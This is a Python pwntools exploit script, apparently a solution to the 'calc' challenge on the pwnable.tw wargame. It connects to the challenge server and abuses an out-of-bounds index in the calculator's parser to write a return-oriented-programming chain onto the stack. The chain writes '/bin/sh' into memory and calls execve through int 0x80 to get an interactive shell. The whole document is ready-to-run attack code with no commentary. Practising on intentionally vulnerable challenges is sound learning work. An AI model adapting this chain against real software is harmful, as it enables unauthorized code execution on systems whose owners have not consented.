from pwn import *

#p = process('./calc')
p = remote("chall.pwnable.tw", 10100)

_bin = 0x6e69622f
__sh = 0x0068732f
pop_eax = 0x805c34b
pop_ecx_ebx = 0x80701d1
pop_edx = 0x80701aa
int80 = 0x8070880
write_ecx = 0x80958c2

binsh = 0x80ee360

def write_payload(idx, val):
    payload1 = b"+" + str(idx).encode()
    p.sendline(payload1)
    ret_addr = int(p.recvline())
    if ret_addr < 0:
        ret_addr *= -1
    payload = b"+" + str(idx).encode() + b"+" + str(val).encode() + b"-" + str(ret_addr).encode()
    p.sendline(payload)
    p.recv(1024)
p.recvuntil(b'=== Welcome to SECPROG calculator ===\n')
write_payload(361, pop_eax)
write_payload(362, _bin)
write_payload(363, pop_ecx_ebx)
write_payload(364, binsh)
write_payload(365, binsh)
write_payload(366, write_ecx)

write_payload(367, pop_eax)
write_payload(368, __sh)
write_payload(369, pop_ecx_ebx)
write_payload(370, binsh + 4)
write_payload(371, binsh + 4)
write_payload(372, write_ecx)

write_payload(373, pop_eax)
write_payload(374, 11)
write_payload(375, pop_ecx_ebx)
write_payload(376, binsh + 8)
write_payload(377, binsh)
write_payload(378, pop_edx)
write_payload(379, binsh + 8)
write_payload(380, int80)

p.sendline(b"")
p.interactive()